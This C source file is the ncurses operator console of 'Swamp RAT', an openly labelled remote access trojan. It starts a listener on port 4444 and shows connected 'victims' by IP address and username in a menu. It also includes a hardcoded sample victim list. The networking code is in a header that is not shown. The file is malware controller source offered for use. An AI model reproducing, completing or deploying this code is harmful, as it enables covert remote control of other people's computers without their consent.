/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <ncurses.h>
#include <menu.h>
#include <errno.h>
#include <pthread.h>
#include "net.h"

#define ARRAY_SIZE(a)(sizeof(a) / sizeof(a[0]))

char *itoa(int x){
  /*
    :TODO: integer to (char *)
    :x: integer
    :returns: (char *)
  */
  char* buffer = malloc(sizeof(char) * sizeof(int) * 4 + 1);
  if (buffer){
    sprintf(buffer, "%d", x);
  }
  return buffer;
}

bool ncurses_window_cleanup(WINDOW *win){
  /*
    :TODO: clean up window
    :returns: boolean
  */
  delwin(win);
  endwin();
  refresh();
  return true;
}

bool ncurses_window_border(WINDOW *win){
  /*
    :TODO: draw window border
    :returns: boolean
  */
  box(win, 0, 0);
  refresh();
  return true;
}

bool ncurses_window_title(WINDOW *win, char *title){
  /*
    :TODO: draw window title
    :win: pointer to window struct
    :title: title of window
    :returns: boolean
  */
  int x, y;
  getmaxyx(win, y, x);
  mvprintw(0, ((x / 2) - (strlen(title)/2)), title);
  refresh();
  return true;
}

bool ncurses_window_footer(WINDOW *win, char *footer){
  /*
    :TODO: draw window footer
    :win: pointer to window struct
    :footer: footerof window
    :returns: boolean
  */
  int x, y;
  getmaxyx(win, y, x);
  mvprintw(y - 1, ((x / 2) - (strlen(footer) / 2)), footer);
  refresh();
  return true;
}

#ifndef NCURSES_MAIN_WIN_COLOR
#define NCURSES_MAIN_WIN_COLOR 1
#endif

#ifndef NCURSES_MENU_WIN_COLOR
#define NCURSES_MENU_WIN_COLOR 2
#endif

char *victims[] = {
  "c3rb3ru5@192.168.0.1",
  "1337h@x0r@192.168.0.2",
  "nu11byt3@192.168.0.3",
  "ubuntu@192.168.0.4",
  "gentoo@192.168.0.5",
  (char *)NULL,
};

void ncurses_print_menu_title(WINDOW *win,
                     int starty,
                     int startx,
                     int width,
                     char *string){
  int length, x, y;
  float temp;

  if(win == NULL){
    win = stdscr;
  }
  getyx(win, y, x);
  if(startx != 0){
    x = startx;
  }
  if(starty != 0){
    y = starty;
  }
  if(width == 0){
    width = 80;
  }
  length = strlen(string);
  temp = (width - length)/ 2;
  x = startx + (int)temp;
  mvwprintw(win, y, x, "%s", string);
  refresh();
}

bool ncurses_menu_cleanup(MENU *menu){
  /*
    :TODO: cleanup menu
    :menu: (MENU *)
    :returns: boolean
  */
  unpost_menu(menu);
  free_menu(menu);
  return true;
}

bool ncurses_item_cleanup(ITEM **items, int n_items){
  for(int i = 0; i < n_items; ++i){
    free_item(items[i]);
  }
  return true;
}

bool ncurses_item_victims(ITEM **items){
  int j = 0;
  for(int i = 0; i < NET_MAX_CLIENTS; ++i){
    if (p_victims[i] != NULL){
      items[j] = new_item(p_victims[i]->sysinfo.ip,
                          p_victims[i]->sysinfo.username);
      j++;
    }
  }
  return true;
}

bool ncurses_window_victims(WINDOW *win_main,
                            MENU *menu,
                            WINDOW *win_menu,
                            char *win_menu_title,
                            int x_pos,
                            int y_pos,
                            int y_margin,
                            int x_margin){
  /*
    :TODO: draw victims menu
    :win_main: pointer to main window
    :menu: pointer to menu
    :win_menu: pointer to menu window
    :win_menu_title: title for menu
    :x_pos: x position of menu
    :y_pos: y position of menu
    :y_margin: y margin
    :x_margin: x margin
    :returns: boolean
  */
  int x, y;
  getmaxyx(win_main, y, x);
  wmove(win_menu, x_pos, y_pos);
  wresize(win_menu, (y - (y_margin * 2)), (x - (x_margin * 2)));
  wbkgd(win_menu, COLOR_PAIR(NCURSES_MENU_WIN_COLOR));
  keypad(win_menu, true);
  set_menu_win(menu, win_menu);
  set_menu_sub(menu, derwin(win_menu, 6, 38, 3, 1));
  set_menu_mark(menu, " -> ");
  box(win_menu, 0, 0);
  ncurses_print_menu_title(win_menu, 1, 0, (x - (x_margin * 2)), win_menu_title);
  mvwaddch(win_menu, y_margin, 0, ACS_LTEE);
  mvwhline(win_menu, y_margin, 1, ACS_HLINE, ((x - (x_margin * 2)) - 2));
  mvwaddch(win_menu, y_margin, (x - (x_margin * 2)) - 1, ACS_RTEE);
  post_menu(menu);
  refresh();
  return true;
}

void *thread1(){
  net_start_server(4444);
}

bool ncurses_main(){
  /*
    :TODO: main ncurses interface
    :returns: boolean
  */
  int port = 4444;
  int x, y, key, n_victims;
  int x_margin, y_margin;
  ITEM **items;
  MENU *menu;
  WINDOW *win_menu, *win_main;
  pthread_t thread_net_server;
  char win_main_title[] = "|Swamp RAT|";
  char win_menu_title[] = "V1c71m5";

  // create server thread
  if (pthread_create(&thread_net_server, NULL, thread1, NULL) != 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  x_margin = 4;
  y_margin = 2;

  // set env for correct terminal viewing
  if(putenv("TERM=linux") != 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  // initalize main window
  if ((win_main = initscr()) == NULL){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  // start colors and check for color support
  if (start_color() == ERR || !has_colors() || !can_change_color()){
    ncurses_window_cleanup(win_main);
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  // hide cursor
  curs_set(0);
  
  // get main window max width and height;
  getmaxyx(win_main, y, x);
  
  // setup main window
  init_pair(NCURSES_MAIN_WIN_COLOR, COLOR_GREEN, COLOR_BLACK);
  init_pair(NCURSES_MENU_WIN_COLOR, COLOR_RED, COLOR_BLACK);
  wbkgd(win_main, COLOR_PAIR(NCURSES_MAIN_WIN_COLOR));
  ncurses_window_border(win_main);
  ncurses_window_title(win_main, win_main_title);
  ncurses_window_footer(win_main, "|v0.9b|");
    
  cbreak();
  noecho();
  keypad(stdscr, true);

  // set items for menu of victim machines
  /* n_victims = ARRAY_SIZE(victims); */
  /* items = (ITEM **)calloc(n_victims, sizeof(ITEM *)); */
  /* for(int i = 0; i < n_victims -1; ++i){ */
  /*   items[i] = new_item(itoa(i+1), victims[i]); */
  /* } */

  /* // create menu of victim machines */
  /* menu = new_menu((ITEM **)items); */


  n_victims = net_get_victim_count();
  items = (ITEM **)calloc(n_victims, sizeof(ITEM *));
  ncurses_item_victims(items);
  menu = new_menu((ITEM **)items);
  

  // create menu window
  win_menu = newwin((y - (y_margin * 2)),
                    (x - (x_margin * 2)),
                    2,
                    4);
  ncurses_window_victims(win_main,
                         menu,
                         win_menu,
                         win_menu_title,
                         4,
                         2,
                         y_margin,
                         x_margin);
  wrefresh(win_menu);
  
  while((key = getch()) != 27){
    switch(key){
    case KEY_RESIZE:
      getmaxyx(win_main, y, x);
      wclear(win_main);
      wclear(win_menu);
      ncurses_window_border(win_main);
      ncurses_window_title(win_main, win_main_title);
      ncurses_window_footer(win_main, "|0.9b|");
      n_victims = net_get_victim_count();
      items = (ITEM **)calloc(n_victims, sizeof(ITEM *));
      ncurses_item_victims(items);
      menu = new_menu((ITEM **)items);
      ncurses_window_victims(win_main,
                             menu,
                             win_menu,
                             win_menu_title,
                             4,
                             2,
                             y_margin,
                             x_margin);
      wrefresh(win_main);
      wrefresh(win_menu);
      break;
    case KEY_DOWN:
      menu_driver(menu, REQ_DOWN_ITEM);
      wrefresh(win_menu);
      break;
    case KEY_UP:
      menu_driver(menu, REQ_UP_ITEM);
      wrefresh(win_menu);
      break;
    }
    n_victims = net_get_victim_count();
    items = (ITEM **)calloc(n_victims, sizeof(ITEM *));
    ncurses_item_victims(items);
    menu = new_menu((ITEM **)items);
  }	

  ncurses_menu_cleanup(menu);
  ncurses_item_cleanup(items, n_victims);
  endwin();
  return true;
}
